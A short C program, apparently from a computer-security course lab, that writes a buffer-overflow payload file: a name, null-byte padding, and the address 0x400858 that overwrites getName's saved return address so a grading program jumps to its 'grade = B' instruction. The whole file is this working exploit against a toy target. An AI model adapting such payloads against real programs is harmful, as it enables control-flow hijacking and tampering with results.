
#include <stdio.h>

int main(void){
   FILE *psFile;
   int i;
   unsigned long ulData;
   psFile = fopen("dataB", "w");
   /* Puts names in buf array to be copied */ 
   fputs("Rohan Alex",psFile);

   /* Fills the rest of buf array with null bytes */ 
   for (i = 0; i < 38; i++)
      putc('\0', psFile);

   /* Overwrites getName x30 return address with location
      of grade = B instruction in main */ 
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   fclose(psFile); 
   return 0; 
}
